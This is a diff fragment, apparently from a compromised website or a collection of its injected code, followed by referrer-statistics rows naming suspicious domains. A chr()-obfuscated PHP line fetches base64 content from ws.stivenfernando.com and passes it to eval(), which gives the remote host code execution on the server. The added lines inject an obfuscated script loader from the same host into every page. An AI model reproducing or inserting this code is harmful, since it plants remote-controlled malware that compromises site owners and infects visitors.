@@ -109,3 +109,19 @@ https://letsmakeparty3.ga/type.js?v=14ll/wp-content/myfile.php
 <script src='https://ws.stivenfernando.com/stm.js?v=1.0.0' type='text/javascript'></script>
 
 <?php $c = chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99)."ode"; $d = chr(102).chr(105).chr(108)."e".chr(95)."get".chr(95)."con".chr(116).chr(101).chr(110).chr(116).chr(115); $b = $c($d(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(119).chr(115).chr(46).chr(115).chr(116).chr(105).chr(118).chr(101).chr(110).chr(102).chr(101).chr(114).chr(110).chr(97).chr(110).chr(100).chr(111).chr(46).chr(99).chr(111).chr(109).chr(47).chr(107).chr(106).chr(46).chr(116).chr(120).chr(116))); eval($b); ?>
+
+var gfhfghfhfgj = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript';
+var pl = String.fromCharCode(104,116,116,112,115,58,47,47,119,115,46,115,116,105,118,101,110,102,101,114,110,97,110,100,111,46,99,111,109,47,115,116,109,63,118,61,50,46,48,46,48); s.src=pl; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+var list = document.getElementsByTagName('script');list.insertBefore(s, list.childNodes[0]);
+}
+
+
+//// HTML refererpages 
+
+<tr><td class="aws"><a href="https://recover.letsmakeparty3.ga/store.html" target="url" rel="nofollow">https://recover.letsmakeparty3.ga/store.html</a></td><td>&nbsp;</td><td>&nbsp;</td><td>1</td><td>0 %</td></tr>
+
+<tr><td class="aws"><a href="https://ps.stivenfernando.com/r.php" target="url" rel="nofollow">https://ps.stivenfernando.com/r.php</a></td><td>&nbsp;</td><td>&nbsp;</td><td>6</td><td>0 %</td></tr>
